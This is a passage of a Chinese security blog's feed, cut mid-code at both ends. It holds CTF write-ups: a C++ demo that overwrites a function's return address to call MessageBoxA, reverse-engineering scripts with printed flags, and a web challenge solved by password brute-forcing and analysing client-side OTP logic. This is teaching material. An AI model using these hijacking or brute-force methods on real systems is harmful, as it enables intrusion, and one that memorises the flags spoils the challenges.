punctuation">]</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//相当于把ret返回地址复制了一遍</span>    ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>MessageBoxA<span class="token punctuation">;</span>    <span class="token comment">//ary[4] = ary[3]; //这条指令写到这个位置和写在上面一个位置是完全不一样的哟！</span>    ary<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 恭喜你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> MB_OK<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"恭喜你中毒了"</span><span class="token punctuation">,</span> <span class="token string">"你中毒了"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="改进前后的栈帧对比"><a href="#改进前后的栈帧对比" class="headerlink" title="改进前后的栈帧对比"></a>改进前后的栈帧对比</h3><p>由于ipencil长时间不用，现在才发现已经被我摔坏了，以后不常用的东西还是保管好呢，不要满不在意，用的时候才发现坏了。</p><p>所以我就直接用手写的图了，懒得画图了。</p><p>也确实是该换手机了，手机前置摄像头找出来的照片有点黑。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220917164427.jpg" alt="栈空间对比"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>因为我们采用栈溢出的方式调用了函数，那么应该<code>push到栈中的参数占的空间</code>占用了<code>其他栈帧的空间</code>。所以会导致后续程序流发生不可控制的变化。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220917164601.png" alt="MessageBoxA的汇编代码"></p><p>汇编中的<code>retn 10h</code>就是为了平衡call函数之前push到栈里面的参数所占的空间。第一开始不理解的地方就在于此，我觉得<code>retn 10h</code>平衡的也就是<code>4个参数--16字节</code>。但是up主却用了五个<code>push ebp</code>。</p><p>实际上，<code>retn 10h</code>使栈空间减少了20个字节的空间。</p><blockquote><p>retn操作：先eip=esp，然后esp=esp+4<br>retn N操作：先eip=esp，然后esp=esp+4+N</p></blockquote><p>所以是20个字节！也就是五个<code>push ebp</code>就可以提前把这20个字节的空间弄出来。而不用影响到后续main函数的栈帧。</p><p>除此之外呢，我还发现vs—debug编译模式和release模式，是非常不一样的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220917165306.png" alt="vs-debug&amp;release"></p><p>debug简单来说是为了方便分析程序，release模式是发布程序。我使用ida反汇编之后发现，debug生成的exe的汇编代码中添加了很多关于栈空间和一些寄存器的检查工作。而release模式下，是没有这些检查函数的。</p><h2 id="第二讲–改进"><a href="#第二讲–改进" class="headerlink" title="第二讲–改进"></a>第二讲–改进</h2><p>通过前面的第一讲，我们明白了要解决通过栈溢出调用函数而导致的栈平衡问题。</p><p>up 还留了一个坑。 就是要采用什么样的方式去平衡栈，而不用写汇编。</p><h3 id="预知识"><a href="#预知识" class="headerlink" title="预知识"></a>预知识</h3><p>函数调用有<code>__cdecl</code>、<code>__stdcall</code>。</p><p>__cdecl 是C Declaration的缩写（declaration，声明），表示C语言默认的函数调用方法：所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈。被调用函数不会要求调用者传递多少参数，调用者传递过多或者过少的参数，甚至完全不同的参数都不会产生编译阶段的错误。</p><p>_stdcall 是StandardCall的缩写：所有参数从右到左依次入栈，如果是调用类成员的话，最后一个入栈的是this指针。这些堆栈中的参数由被调用的函数在返回后清除，使用的指令是 retnX，X表示参数占用的字节数，CPU在ret之后自动弹出X个字节的堆栈空间。称为自动清栈。函数在编译的时候就必须确定参数个数，并且调用者必须严格的控制参数的生成，不能多，不能少，否则返回后会出错。</p><p>MessageBoxA显然属于_stdcall。由被调用函数自己清栈。这也是系统API的特点之一。这样做的好处就是，严格控制了传递参数的个数，或多或少都不行。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919153649.png" alt="MessageBoxA"></p><p>MsgBox 属于_cdecl调用方式，由调用者自己清栈，这个过程中你传递参数的个数可以变化，这也是为什么可以定义可变参数的原因把。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919154006.png" alt="MsgBox"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通过预知识的学习，我们知道了自定义函数和系统API调用采用的平栈方式不同，那么我们能不能利用这个特性来实现平栈呢？</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919154545.png" alt="改进思路"></p><p>通过上图可以发现，我们通过给自定义函数增加参数，实现的效果和<code>push ebp</code>的效果一致。但是仅仅是这样不能够平栈，因为系统调用的时候还是会<code>retn 10h</code>，而由于_cdecl平栈的特性，其还<code>add esp 14h</code>。所以也就相当于进行了两次平栈操作。</p><p>那么 评论区大lao 的思路就是跳过 <code>add esp 14h</code>。由于这句指令是 3 字节，所以我们要在 <code>ary[4] = ary[3] + 3</code>。这样就跳到了下一条指令<code>push 0</code>的地址。</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">void MsgBox(int a, int b, int c, int d, int e)&#123;    int ary[2];    ary[4] &#x3D; ary[3] + 3 ; &#x2F;&#x2F;跳过 esp    ary[3] &#x3D; (int)MessageBoxA;    ary[5] &#x3D; 0;    ary[6] &#x3D; (int)&quot;NO_CALL 恭喜你中毒了&quot;;    ary[7] &#x3D; (int)&quot;NO_CALL 你中毒了&quot;;    ary[8] &#x3D; MB_OK;&#125;int main()&#123;    MsgBox(1,2,3,4,5);    MessageBoxA(0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后up又对这个思路进行了改进。既然我们传递了一些参数，而且后续我们又把这些参数当作了MessageBoxA这个函数的参数，那么为什么不在传递参数的时候就把该传递的参数传进去呢。</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">void MsgBox(void* address,HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)&#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[4] + 3;&#125;int main()&#123;    MsgBox(MessageBoxA,0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第三讲–完美"><a href="#第三讲–完美" class="headerlink" title="第三讲–完美"></a>第三讲–完美</h2><p>通过上述方式，我们知道了是需要跳过<code>_cdecl</code>或者是<code>_stdcall</code>两种平栈方式中的一种。那我们就可以利用这个欺骗编译器。</p><p>在声明的时候不给函数参数，但是在调用的时候，欺骗编译器这是个<code>_stdcall</code>类型且带有4个参数的函数，那么编译器会帮助我们将参数压栈，并且消除了<code>add esp 14h</code>的影响。</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">&#x2F;&#x2F;完美版本void MsgBox() &#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];&#125;&#x2F;&#x2F;ret----_cdecl 方式返回typedef int* (_stdcall* _hMessageBoxA)(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);&#x2F;&#x2F;这样做的好处是，代码可复用性强。后续只需要写写声明就可以了。typedef int* (_stdcall* _hMessageBoxW)(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);int main()W&#123;    &#x2F;&#x2F;完美版本    ((_hMessageBoxA)MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);    ((_hMessageBoxA)MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="所有的代码"><a href="#所有的代码" class="headerlink" title="所有的代码"></a>所有的代码</h2><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;#pragma optimize(&quot;&quot;,off)&#x2F;&#x2F; 初始版本void MsgBox1(int a, int b, int c, int d, int e)&#123;    int ary[2];    ary[4] &#x3D; ary[3]; &#x2F;&#x2F;相当于把ret返回地址复制了一遍    ary[3] &#x3D; (int)MessageBoxA;    &#x2F;&#x2F;ary[4] &#x3D; ary[3]; &#x2F;&#x2F;这条指令写到这个位置和写在上面一个位置是完全不一样的哟！    ary[5] &#x3D; 0;    ary[6] &#x3D; (int)&quot;NO_CALL 恭喜你中毒了&quot;;    ary[7] &#x3D; (int)&quot;NO_CALL 你中毒了&quot;;    ary[8] &#x3D; MB_OK;&#125;&#x2F;&#x2F;进阶版本void MsgBox2(int a, int b, int c, int d, int e)&#123;    int ary[2];    ary[4] &#x3D; ary[3] + 3; &#x2F;&#x2F;跳过 esp    ary[3] &#x3D; (int)MessageBoxA;    &#x2F;&#x2F;ary[4] &#x3D; ary[3]; &#x2F;&#x2F;这条指令写到这个位置和写在上面一个位置是完全不一样的哟！    ary[5] &#x3D; 0;    ary[6] &#x3D; (int)&quot;NO_CALL 恭喜你中毒了&quot;;    ary[7] &#x3D; (int)&quot;NO_CALL 你中毒了&quot;;    ary[8] &#x3D; MB_OK;&#125;&#x2F;&#x2F;进阶版本---改进void MsgBox2_1(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)&#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[4] + 3;&#125;&#x2F;&#x2F;完美版本void MsgBox() &#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];&#125;&#x2F;&#x2F;ret----_cdecl 方式返回typedef int* (_stdcall* _hMessageBoxA)(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);int main()&#123;    &#x2F;&#x2F;完美版本    ((_hMessageBoxA)MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);    ((_hMessageBoxA) MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>不知道怎么说，自己的水平还是差了很多，up主所提到的安全思维也没有。很有可能做一辈子也是个普通人，但那又能怎么样呢? 一直学下去呗。不断丰富自己，最后不会太差哒！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW-CTF--Write-Rev</title>
      <link href="/2022/09/10/csaw-ctf-rev/"/>
      <url>/2022/09/10/csaw-ctf-rev/</url>
      
        <content type="html"><![CDATA[<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="DockREleakage"><a href="#DockREleakage" class="headerlink" title="DockREleakage"></a>DockREleakage</h2><p>这个题目就比较简单，感觉不太像是逆向，有点像是溯源。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160143.png" alt="文件目录结构"></p><p>既然题目中说到了,隐私的数据要保管好。那么大概就是直接在文件中出现的。</p><p>打开acb…..这个文件之后，找到了flag的一部分，文件中说明了，剩下的flag要我们自己去找。所以呢，继续去找其他的文件。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160356.png" alt="flag的一部分"></p><p>最终在另一个文件中找到了剩余的flag</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160527.png" alt="flag剩余的部分"></p><h2 id="Anya-Gacha"><a href="#Anya-Gacha" class="headerlink" title="Anya Gacha"></a>Anya Gacha</h2><h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>data = “wakuwaku” —&gt; byte类型 “77616b7577616b75”<br>sha256(byte(data)) —-&gt; 产生的是256bit的数据<br>注意，由于sha256产生的256bit的数据，所以接下来的编码方式就很重要。<br>如果你把这256bit的数据 转换为 16进制的字符串，那么应该是64个字符。<br>这个时候，如果你还想继续进行hash运算，你又要将<code>16进制字符串转为byte类型</code>。而此时转换为的<code>byte类型是512bit</code>，因为是要按照<code>utf-8</code>的编码方式进行。</p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>这个题目，提供了一个根据unity写的游戏。下载对应系统版本之后打开，我下载的是win版本的。</p><p>游戏页面中说明了，保证在1000内抽到这个人物。而这个人物会告诉你答案。有点类似于某些游戏的抽奖保底机制。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160725.png" alt="游戏页面"></p><p>根据网上的资料，要想逆向<code>unity</code>写的游戏，<code>dnsPy</code>这个工具不可或缺。下载完成之后，把包含程序主题逻辑的<code>Assembly-CSharp.dll</code>文件送入。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910161029.png" alt="Assembly-CSharp.dll"></p><p>反汇编之后的代码都是明文的，C#语言读起来也非常友好。很容易我们就发现了关键函数。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910161219.png" alt="wish函数"><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910161248.png" alt="upload函数"></p><p>阅读之后程序的主题逻辑也就清楚了</p><ul><li>每点击一次wish–抽奖，程序会把初始字符串<code>wakuwaku</code>进行一次hash运算</li><li>然后通过base64加密之后将其发往固定的服务器</li><li>判断服务器是否返回数据—经过测试，如果是不正确的hash，目标服务器不会返回任何数据。</li></ul><p>所以，我们就直接hash 1000次，然后base64加密之后，发给服务器就行。工具我用的是filder</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64data <span class="token operator">=</span> <span class="token string">"wakuwaku"</span>   <span class="token comment"># 要进行加密的数据</span>data <span class="token operator">=</span> data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data_sha <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> data_shab64_byt <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64_byt <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><h3 id="关键-1"><a href="#关键-1" class="headerlink" title="关键"></a>关键</h3><p>这里qmemcpy函数的第二个参数表面上看上去只有4个字节，但实际上传递到该函数中的只是<code>指向第一个字符的指针</code>。\</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911165015.png" alt="memcopy"></p><p>之所以在反汇编函数中仅仅出现cook这四个字母，是因为cook后面保存的是00。让编译器误认为其字符串结束了。以后在遇到的时候，就直接当指针处理。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911165307.png" alt="20220911165307"></p><h3 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h3><p>本题提供了game 的exe程序，但真正的game程序部署在服务器上。我们需要根据现有的程序，推断程序的逻辑。再通过nc，得到五个被切分的flag文件，最后提交。</p><p>程序大体逻辑为，其通过设置迷宫游戏中五个特殊的位置。当走到这五个特殊的位置时，会提示你输入密码。如果你输入的密码正确，会显示flag的一部分。当你把全部的特殊位置全部解决之后，就可以按顺序把正确的flag拼接出来。</p><p>通过下面这个函数，我们可以看得出来<code>v7</code>的值只能是<code>0,1,2,3,4</code>。那么对应的<code>v8</code>同样也只能是 <code>0,1,2,3,4</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911165425.png" alt="关键函数1"></p><p>然后是<code>fnv_1a_32</code>函数,这里我不明白为什么反汇编出来居然有三个参数。但是通过汇编代码来看的话，只有一个参数。该函数就是异或操作，我们需要定位的就是这个参数。而这个参数通过<code>v8</code>就能确定。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911170324.png" alt="fnv_1a_32汇编代码"><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911170633.png" alt="函数逻辑"></p><p>因为v11已知，所以我们根据<code>v8</code>可以计算出相应的<code>pass</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">while_count <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>a <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6c</span><span class="token punctuation">,</span>    <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span>    <span class="token number">0x6e</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span>    <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token keyword">for</span> k <span class="token keyword">in</span> while_count<span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token number">2166136261</span>    part <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">*</span>k<span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment">#print(str(part))</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> part<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        result <span class="token operator">=</span> <span class="token number">16777619</span><span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token punctuation">(</span>result <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数可以计算出五个不同的值，接下来要做的，就是通过nc链接服务器，找到迷宫中的特殊位置，尝试这五个不同的密码。拼接所有的flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911171154.png" alt="结果"></p><p>这里找到特殊位置的方法，不知道有没有什么窍门。反正我是一个一个试的，纯粹是按照遍历的方法试出来的。按照顺序试就行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911171521.png" alt="1-1路径"></p><p>最终flag为<code>flag&#123;e@5+er_e995_6ehind_p@yw@115_i5_+he_dum6e5+_ide@_ever!!&#125;</code></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arab Security Cyber Wargames 2022</title>
      <link href="/2022/08/15/ascwg-2022-writeup/"/>
      <url>/2022/08/15/ascwg-2022-writeup/</url>
      
        <content type="html"><![CDATA[<p>本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。</p><p>Sometimes you win, sometimes you learn.</p><span id="more"></span><p>说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。</p><h2 id="1-Web"><a href="#1-Web" class="headerlink" title="1 Web"></a><strong>1 Web</strong></h2><h3 id="1-1-Drunken-Developer"><a href="#1-1-Drunken-Developer" class="headerlink" title="1-1 Drunken Developer"></a>1-1 <strong>Drunken Developer</strong></h3><p>本关为Web题目的第一题。网站给出了一个登陆界面，包含用户名和密码。查看网页源码发现其中嵌入了管理员的用户名，再没有其他信息的情况下首先用爆破的方法尝试。爆破出管理员密码后登陆进入即获得Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-1.png" alt="1-1-1"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/Ad5EXRN42DyBWy38v8uwGA.png" alt="1-1-2"></p><p>登陆进入后获得Flag：<code>ASCWG&#123;\%Sca21_QS_2\!3eSKC&amp;qw9@_warmup&#125;</code></p><h3 id="1-2-Konan"><a href="#1-2-Konan" class="headerlink" title="1-2 Konan"></a>1-2 <strong>Konan</strong></h3><p>本题为Web题目的第二道题。</p><p>进入网站后是一个登陆页面，在输入用户名为admin或者root后会动画地跳出OTP(One Time Password)的输入框。但是我们没有其他获得OTP，而且主办方说了此题不涉及爆破，所以我们需要另寻它路。</p><p><strong>此题目展示了非常好的解决Web题目的思路：首先观察行为所生成的请求包和响应包的参数，然后在网页的js或者其他脚本源码中对参数进行搜索，从而获得前后端交互的API和逻辑。</strong></p><p>我们可以看到，在输入错误的OTP后，服务器端会返回存有errors和reason的响应包。在primary.js中搜索相关参数我们即可获得客户端的处理逻辑。                 </p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-1.png" alt="1-2-1"></p><p>由下可见，当服务器端的相应包中的errors参数为false时，客户端会生成Ticket并且访问/admin页面。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">## primary<span class="token punctuation">.</span>js line <span class="token number">534</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#subB'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>firstTime<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dataSend<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string-property property">"user"</span><span class="token operator">:</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dataSend<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string-property property">"OTP"</span><span class="token operator">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#OTP'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 